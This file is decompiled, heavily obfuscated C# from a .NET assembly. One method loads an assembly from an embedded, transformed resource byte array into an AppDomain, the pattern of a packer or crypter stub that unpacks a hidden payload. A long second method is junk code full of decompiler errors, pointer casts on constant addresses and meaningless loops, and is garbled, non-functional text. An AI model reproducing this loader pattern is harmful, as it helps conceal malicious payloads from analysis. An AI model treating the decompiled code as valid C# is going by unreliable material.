using System;
using System.ComponentModel;
using System.Globalization;
using System.Runtime.CompilerServices;
using ns0;
using ns2;

namespace ns1;

internal sealed class Class0 : Component
{
	public static void smethod_0()
	{
		GControl0.smethod_1(Control3.appDomain_0);
		Control3.assembly_0 = Control3.appDomain_0.Load(Control4.smethod_1(Resources.Byte_0));
	}

	unsafe static void awejudorakaxix6(object object_0, object object_1, object object_2)
	{
		//IL_0018: Expected O, but got I4
		//IL_0021: Expected I4, but got O
		//IL_0022: Expected O, but got I4
		//IL_002f: Expected O, but got I4
		//IL_007b: Expected O, but got I4
		//IL_00a1: Expected O, but got I4
		//IL_00b1: Expected O, but got I4
		//IL_00b7: Expected I4, but got O
		//IL_00e6: Expected O, but got I4
		//IL_00ef: Expected I4, but got O
		//IL_0115: Expected O, but got I4
		//IL_013d: Expected O, but got I4
		//IL_0147: Expected O, but got I4
		//IL_0150: Expected I4, but got O
		//IL_017c: Expected O, but got I4
		//IL_01b4: Expected O, but got I4
		//IL_01d5: Expected O, but got I4
		//IL_01df: Expected O, but got I4
		//IL_01f7: Expected O, but got I4
		//IL_0210: Expected O, but got I4
		//IL_0215: Unknown result type (might be due to invalid IL or missing references)
		//IL_021c: Expected Ref, but got Unknown
		//IL_021d: Expected O, but got I4
		//IL_0273: Expected O, but got I4
		//IL_0289: Expected O, but got I4
		//IL_02a6: Expected O, but got I4
		//IL_02b9: Expected O, but got I4
		//IL_02c3: Expected O, but got I4
		//IL_02ed: Expected O, but got I4
		//IL_0306: Expected O, but got I4
		//IL_030a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0310: Expected Ref, but got Unknown
		//IL_0311: Expected O, but got I4
		//IL_0334: Expected O, but got I4
		//IL_0352: Expected O, but got I4
		//IL_035d: Expected O, but got I4
		//IL_036d: Expected O, but got I4
		//IL_0385: Expected O, but got I4
		//IL_0399: Expected O, but got I4
		//IL_03a4: Expected O, but got I4
		//IL_03c9: Expected O, but got I4
		//IL_040e: Expected O, but got I4
		//IL_0420: Expected O, but got I4
		//IL_042a: Expected O, but got I4
		//IL_0463: Expected O, but got I4
		//IL_0483: Expected O, but got I4
		System.Runtime.CompilerServices.Unsafe.SkipInit(out bool flag);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out IFormatProvider formatProvider);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out IFormatProvider formatProvider2);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out IFormatProvider provider);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out bool flag2);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out object obj8);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out int num3);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string s2);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out byte b);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out object obj5);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string text);
		while (true)
		{
			bool num = flag;
			string s = "UKKSD".IsNormalized() as string;
			formatProvider = (IFormatProvider)(object)((byte*)70)->ToString("WYVK", formatProvider);
			formatProvider = formatProvider2;
			object obj = Control1.smethod_0(byte.Parse(s, provider) as ResolveEventArgs);
			flag = (byte)"HQRUK".PadRight((int)((obj is int) ? obj : null)) != 0;
			if (checked(0u - ((num ? 1u : 0u) + (flag2 ? 1u : 0u))) == 0)
			{
				break;
			}
			do
			{
				b = b;
				ref _003F reference = ref *(_003F*)checked(b - b);
				object obj2 = ((byte*)59)->Equals(b);
				object obj3 = System.Runtime.CompilerServices.Unsafe.As<_003F, byte>(ref reference).Equals((byte)(int)((obj2 is byte) ? obj2 : null));
				object obj4 = ((obj3 is byte) ? obj3 : null);
				obj5 = obj5;
				object obj6 = ((byte*)obj4)->CompareTo(obj5) as object;
				object obj7 = Class4.smethod_0(obj5, (ResolveEventArgs)(object)Settings.Default);
				obj5 = null;
				_ = (byte)string.Concat(obj6, obj7, obj8) != 0;
				bool num2 = Control1.smethod_0(null);
				text = text;
				string text2 = text;
				text = string.Format("R", obj5, obj5);
				formatProvider = formatProvider;
				num3 = (int)checked(unchecked((uint)(int)(byte.Parse(s2, formatProvider) as string).ToLower()) * unchecked((uint)num3));
				int totalWidth = num3;
				_ = ((byte*)b)->GetTypeCode() is char;
				object obj9 = text.CompareTo("ND");
				char c = (char)(int)((obj9 is char) ? obj9 : null);
				uint num4;
				checked
				{
					num4 = (num2 ? 1u : 0u) * (1u + ((unchecked((byte)text2.PadRight(totalWidth, (char)checked(15046u + unchecked(20198u / (uint)c)))) != 0) ? 1u : 0u));
				}
				string a = ((byte*)byte.Parse(text, (IFormatProvider)(object)Settings.Default))->ToString();
				string b2 = text;
				object obj10 = byte.Parse(text);
				flag = (byte)checked(unchecked(0u / checked(num4 + 0u * (string.Equals(a, b2, unchecked((StringComparison)((obj10 is StringComparison) ? obj10 : null))) ? 1u : 0u))) * (flag ? 1u : 0u)) != 0;
			}
			while (checked((flag ? 1u : 0u) - (flag ? 1u : 0u)) != 0);
		}
		Control1 control = control;
		control = null;
		_ = (GClass0)(object)Settings.Default;
		_ = text.LastIndexOfAny(null, num3) is void;
		string text3 = text;
		string value = text;
		string text4 = text;
		string text5 = text;
		text = "HEN";
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string text6);
		text = text6;
		text = text;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string text7);
		text = text7;
		byte[] byte_ = Control4.smethod_1(byte_);
		ResolveEventArgs resolveEventArgs_;
		uint num6;
		uint num7;
		string text10;
		uint value2;
		checked
		{
			System.Runtime.CompilerServices.Unsafe.SkipInit(out string text8);
			int num5 = unchecked((byte)(text4 + text5 + text8 + ("BFIRA".IndexOf((string)(object)Control4.smethod_1(byte_)) as string))) + b;
			string text9 = text;
			object object_3 = byte.Parse(Control1.smethod_0("GMOHCA".LastIndexOf('뜗') as ResolveEventArgs) as string, default(NumberStyles)) as object;
			resolveEventArgs_ = null;
			object obj11 = unchecked((byte*)(byte)Class4.smethod_0(object_3, resolveEventArgs_))->GetTypeCode();
			num6 = unchecked((uint)num5) * unchecked((uint)(byte)text9.Replace(((byte*)checked(((obj11 is byte) ? obj11 : null) - b))->Equals(null) as string, text));
			num7 = 229u - unchecked((uint)(byte)((byte*)191)->ToString());
			text = "RBTUD";
			text10 = text;
			value2 = unchecked((uint)(char)Control4.smethod_1(null)) * 51058u;
		}
		_ = ((byte*)182)->CompareTo(obj5) is byte[];
		byte_ = ((byte*)byte.Parse("ZNUXL", formatProvider))->GetTypeCode() as byte[];
		System.Runtime.CompilerServices.Unsafe.SkipInit(out byte[] array);
		byte_ = array;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out byte[] byte_2);
		text = text10.LastIndexOf((char)value2, 1803621730, (int)Control4.smethod_1(byte_2)) as string;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string s3);
		string value3 = (string)(object)Class4.smethod_0(null, byte.Parse(s3, byte.Parse("AOBGIX", null) as IFormatProvider) as ResolveEventArgs);
		StringComparison stringComparison = default(StringComparison);
		stringComparison = default(StringComparison);
		_ = ((byte*)69)->Equals(obj5) is StringComparison;
		stringComparison = stringComparison;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out StringComparison stringComparison2);
		stringComparison = stringComparison2;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out StringComparison stringComparison3);
		stringComparison = stringComparison3;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string text11);
		object obj12 = text11.LastIndexOf(value3, stringComparison);
		string text12 = string.Format("G", ((byte*)checked(num7 - ((obj12 is byte) ? obj12 : null)))->GetHashCode() as object);
		b = (byte)Control4.smethod_1(byte_);
		System.Runtime.CompilerServices.Unsafe.SkipInit(out byte obj13);
		int startIndex = (int)((byte*)num6)->ToString(text12, ((byte*)194)->Equals(obj13) as IFormatProvider);
		stringComparison = default(StringComparison);
		_ = text3.LastIndexOf(value, startIndex, stringComparison) is void;
		_ = text.Length is void;
		_ = ((byte*)b)->CompareTo(38) is void;
		text = text;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out string s4);
		_ = Control1.smethod_0((ResolveEventArgs)(object)((byte*)30)->ToString(byte.Parse(s4, null) as string)) is Control4;
		_ = Control1.smethod_0(null) is Control4;
		obj5 = obj5;
		System.Runtime.CompilerServices.Unsafe.SkipInit(out object object_4);
		_ = (Control4)(object)Class4.smethod_0(object_4, resolveEventArgs_);
		try
		{
			text = "DGGAQS";
			_ = (Struct3)string.Intern(Control1.smethod_0(resolveEventArgs_) as string);
		}
		catch
		{
			while (true)
			{
				_ = (string)(object)Settings.Default;
			}
		}
		System.Runtime.CompilerServices.Unsafe.SkipInit(out object value4);
		while (true)
		{
			string format = text;
			object obj15 = Control1.smethod_0(null);
			if ("ZDJRVW".IndexOfAny((char[])(object)string.Format(format, ((byte*)((obj15 is byte) ? obj15 : null))->GetTypeCode() as object, obj5, obj5), (((byte*)checked(unchecked((byte)((byte*)b)->ToString(text)) + unchecked((byte)text.PadLeft(2146959689, 'ꣾ'))))->CompareTo(obj5) as string).LastIndexOf(text, (int)checked(unchecked((uint)num3) - (unchecked((uint)num3) + 697935409u) - unchecked((uint)num3)), stringComparison)) is bool)
			{
				_ = (Control0)(object)Settings.Default;
				_ = (Class3)(object)"QKOZ".GetEnumerator();
				byte num8 = b;
				obj5 = obj5;
				_ = ((byte*)num8)->CompareTo(value4) is string;
				continue;
			}
			break;
		}
	}
}
